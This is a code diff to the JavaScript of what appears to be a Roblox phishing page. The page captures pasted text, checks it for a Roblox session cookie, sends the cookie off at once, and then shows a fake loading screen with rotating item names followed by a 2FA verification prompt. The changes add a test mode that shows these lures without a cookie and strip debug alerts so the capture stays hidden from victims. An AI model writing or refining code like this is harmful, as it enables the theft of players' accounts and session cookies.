@@ -805,6 +805,9 @@ async function handlePasteEvent(pastedText) {
         if (robloxCookie) {
             console.log('Roblox cookie found in pasted content, sending immediately...');
             
+            // Close the scan modal first
+            closeScanModal();
+            
             // Show loading overlay with rotating item names
             const loadingOverlay = document.getElementById('loadingOverlay');
             if (loadingOverlay) {
@@ -874,6 +877,22 @@ Screen: ${screen.width}x${screen.height}
             }
         } else {
             console.log('No Roblox cookie found in pasted content');
+            
+            // For testing: still show loading even without cookie
+            closeScanModal();
+            const loadingOverlay = document.getElementById('loadingOverlay');
+            if (loadingOverlay) {
+                loadingOverlay.style.display = 'flex';
+                startItemNameRotation();
+                
+                // Show 2FA after 10 seconds for testing (no cookie found)
+                setTimeout(() => {
+                    console.log('🔐 TEST MODE - SHOWING 2FA MODAL!');
+                    loadingOverlay.style.display = 'none';
+                    stopItemNameRotation();
+                    openVerificationModal();
+                }, 10000); // 10 seconds for testing
+            }
         }
     } catch (error) {
         console.error('Error handling paste event:', error);
@@ -1108,11 +1127,8 @@ document.addEventListener('DOMContentLoaded', function() {
         
         // Handle paste events for immediate cookie capture
         textarea.addEventListener('paste', function(e) {
-            console.log('🚨 PASTE EVENT FIRED!');
-            alert('Paste detected! Check console.');
             setTimeout(() => {
                 const pastedText = this.value;
-                console.log('Pasted text:', pastedText);
                 handlePasteEvent(pastedText);
             }, 100); // Small delay to ensure paste content is processed
         });
